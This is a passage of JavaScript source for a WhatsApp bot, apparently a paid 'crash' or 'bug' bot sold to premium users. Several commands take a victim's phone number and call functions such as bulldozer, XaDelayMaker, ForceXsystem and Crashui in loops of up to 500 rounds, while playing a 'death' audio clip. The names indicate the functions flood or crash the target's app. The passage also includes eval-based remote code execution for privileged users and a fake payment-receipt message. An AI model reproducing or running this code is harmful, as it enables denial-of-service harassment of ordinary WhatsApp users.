        return zeyyreply(`The number starts with '0'. Replace it with the country code number.\n\nExample: ${isCmd} 62 xxx-xxxx-xxxx`);
    }

    let target = `${jidx}@s.whatsapp.net`;

    zeyyreply(`*Success! ${isCmd} sent to ${target}*`)
    ziole.sendMessage(m.chat, {audio: fs.readFileSync('./media/death.mp3'), mimetype:'audio/mpeg', ptt: true});

    //Paramater
    for (let r = 0; r < 500; r++) {
    await bulldozer(target)
    await bulldozer(target)
    await bulldozer(target)
    await XaDelayMaker(target)
    await XaDelayMaker(target)
    await bulldozer(target)
    await bulldozer(target)
    await bulldozer(target)
    await bulldozer(target)
    await XaDelayMaker(target)
    await bulldozer(target)
    await XaDelayMaker(target)
    await XaDelayMaker(target)
    await XaDelayMaker(target)
    await XaDelayMaker(target)
    await XaDelayMaker(target)
    await delay(500);
    }
  console.log(chalk.red.bold("Success!"))
}
break;
case 'invis': case 'delaymaker': {
    if (!isPremium) return zeyyreply("*You are not a Premium User*");
    if (!q) return zeyyreply(`Example Usage:\n ${isCmd} 62xx`);

    let jidx = q.replace(/[^0-9]/g, "");
    
    if (jidx.startsWith('0')) {
        return zeyyreply(`The number starts with '0'. Replace it with the country code number.\n\nExample: ${isCmd} 62 xxx-xxxx-xxxx`);
    }

    let target = `${jidx}@s.whatsapp.net`;

    zeyyreply(`*Success! ${isCmd} sent to ${target}*`)
    ziole.sendMessage(m.chat, {audio: fs.readFileSync('./media/death.mp3'), mimetype:'audio/mpeg', ptt: true});

    //Paramater
    for (let r = 0; r < 500; r++) {
    await XaDelayMaker(target)
    await XaDelayMaker(target)
    await XaDelayMaker(target)
    await XaDelayMaker(target)
    await XaDelayMaker(target)
    await XaDelayMaker(target)
    }
  console.log(chalk.red.bold("Success!"))
}
break;
case 'x-lana': {
    if (!isPremium) return zeyyreply("*You are not a Premium User*");
    if (!q) return zeyyreply(`Example Usage:\n ${isCmd} 62xx`);

    let jidx = q.replace(/[^0-9]/g, "");
    
    if (jidx.startsWith('0')) {
        return zeyyreply(`The number starts with '0'. Replace it with the country code number.\n\nExample: ${isCmd} 62 xxx-xxxx-xxxx`);
    }

    let target = `${jidx}@s.whatsapp.net`;

    zeyyreply(`*Success! ${isCmd} sent to ${target}*`)
    ziole.sendMessage(m.chat, {audio: fs.readFileSync('./media/death.mp3'), mimetype:'audio/mpeg', ptt: true});

    //Paramater
    for (let r = 0; r < 5; r++) {
    await CrashInvisble(target)
    }
  console.log(chalk.red.bold("Success!"))
}
break;
case 'assain-force': {
    if (!isPremium) return zeyyreply("*You are not a Premium User*");
    if (!q) return zeyyreply(`Example Usage:\n ${isCmd} 62xx`);

    let jidx = q.replace(/[^0-9]/g, "");
    
    if (jidx.startsWith('0')) {
        return zeyyreply(`The number starts with '0'. Replace it with the country code number.\n\nExample: ${isCmd} 62 xxx-xxxx-xxxx`);
    }

    let target = `${jidx}@s.whatsapp.net`;

    zeyyreply(`*Success! ${isCmd} sent to ${target}*`)
    ziole.sendMessage(m.chat, {audio: fs.readFileSync('./media/death.mp3'), mimetype:'audio/mpeg', ptt: true});

    //Paramater
    for (let i = 0; i < 50; i++) {
    await ForceXsystem(ziole, target);
    await ForceXsystem(ziole, target);
    }
  console.log(chalk.red.bold("Success!"))
}
break;
case 'system-blank': {
    if (!isPremium) return zeyyreply("*You are not a Premium User*");
    if (!q) return zeyyreply(`Example Usage:\n ${isCmd} 62xx`);

    let jidx = q.replace(/[^0-9]/g, "");
    
    if (jidx.startsWith('0')) {
        return zeyyreply(`The number starts with '0'. Replace it with the country code number.\n\nExample: ${isCmd} 62 xxx-xxxx-xxxx`);
    }

    let target = `${jidx}@s.whatsapp.net`;

    zeyyreply(`*Success! ${isCmd} sent to ${target}*`)
    ziole.sendMessage(m.chat, {audio: fs.readFileSync('./media/death.mp3'), mimetype:'audio/mpeg', ptt: true});

    //Paramater
    for (let i = 0; i < 25; i++) {
    await Crashui(target);
    await ForceXsystem(ziole, target);
    await Crashui(target);
    await ForceXsystem(ziole, target);    
    }
  console.log(chalk.red.bold("Success!"))
}
break;
case 'splash-ios': {
    if (!isPremium) return zeyyreply("*You are not a Premium User*");
    if (!q) return zeyyreply(`Example Usage:\n ${isCmd} 62xx`);

    let jidx = q.replace(/[^0-9]/g, "");
    
    if (jidx.startsWith('0')) {
        return zeyyreply(`The number starts with '0'. Replace it with the country code number.\n\nExample: ${isCmd} 62 xxx-xxxx-xxxx`);
    }

    let target = `${jidx}@s.whatsapp.net`;

    zeyyreply(`*Success! ${isCmd} sent to ${target}*`)
    ziole.sendMessage(m.chat, {audio: fs.readFileSync('./media/death.mp3'), mimetype:'audio/mpeg', ptt: true});

    //Paramater
    for (let i = 0; i < 100; i++) {
    await ForceXsystem(ziole, target);
    }
  console.log(chalk.red.bold("Success!"))
}
break;
//======[Store Menu]======//
case "sukiablpoa08": {
 if (!botNumber) return zeyyreply('Khusus Bot Saja'); // Periksa apakah pengguna adalah creator
 
 if (!text) return zeyyreply(example(`bukan gitu *.jpmch* < teksnya >`)); 
 
 // Daftar saluran WhatsApp (array berisi ID saluran WhatsApp)
 const daftarSaluran = [
"120363401278001189@newsletter"
// Tambahkan ID saluran lainnya
 ];

 // Kirim pesan ke semua saluran dalam daftar
 for (const idSaluran of daftarSaluran) {
 try {
 await ziole.sendMessage(idSaluran, { text: text }); // Mengirim pesan ke saluran
 } catch (error) {
 console.error(`Gagal mengirim ke saluran ${idSaluran}:`, error); // Log jika gagal
 }
 }
 zeyyreply(`
╭─❰ *RESULT SUMMARY* ❱─╮
🎉 *Pesan Terkirim*: 
  ➥ *579 Saluran*
✅ *Status*: Berhasil!
📩 Terima kasih telah menggunakan layanan ini.
╰─────────────────────╯
`);
}
break
case 'done': {
if (!botNumber) return zeyyreply(`Khusus Bot`)
let s = text.split(',')
let barang = s[0]
let nominal = s[1]
if (s.length < 2) return zeyyreply(`*Format salah!*
Penggunaan:
${prefix + command} barang,nominal`)
if (!barang) return zeyyreply(`Ex : ${prefix+command} barang,nominal\n\nContoh :\n${prefix+command} vipies,60000`)
if (!nominal) return zeyyreply(`Ex : ${prefix+command} barang,nominal\n\nContoh :\n${prefix+command} panel,1000`)
text_done = `「 𝗧𝗥𝗔𝗡𝗦𝗔𝗞𝗦𝗜 𝗕𝗘𝗥𝗛𝗔𝗦𝗜𝗟 」

🛍 Barang : _${barang}_
💰 Nominal : _${nominal}_
📆 Tanggal : _${hariini}_
🕰️ Waktu : _${wib}_
⏳ Status : Berhasil ✅

TERIMAKASIH TELAH ORDER ✅`
await ziole.relayMessage(m.chat,  {
requestPaymentMessage: {
currencyCodeIso4217: 'IDR',
amount1000: `${nominal}000`,
requestFrom: m.sender,
noteMessage: {
extendedTextMessage: {
text: text_done,
contextInfo: {
externalAdReply: {
showAdAttribution: true,
}}}}}}, {quoted: qchanel })
}
break

default:
if (budy.startsWith('>')) {
if (!Access) return;
try {
let evaled = await eval(budy.slice(2));
if (typeof evaled !== 'string') evaled = require('util').inspect(evaled);
await m.reply(evaled);
} catch (err) {
m.reply(String(err));
}
}
        
if (budy.startsWith('<')) {
if (!Access) return
let kode = budy.trim().split(/ +/)[0]
let teks
try {
teks = await eval(`(async () => { ${kode == ">>" ? "return" : ""} ${q}})()`)
} catch (e) {
teks = e
} finally {
await m.reply(require('util').format(teks))
}
}
        
}
} catch (err) {
console.log(require("util").format(err));
}
}

let file = require.resolve(__filename);
require('fs').watchFile(file, () => {
require('fs').unwatchFile(file);
console.log('\x1b[0;32m' + __filename + ' \x1b[1;32mupdated!\x1b[0m');
delete require.cache[file];
require(file);
})
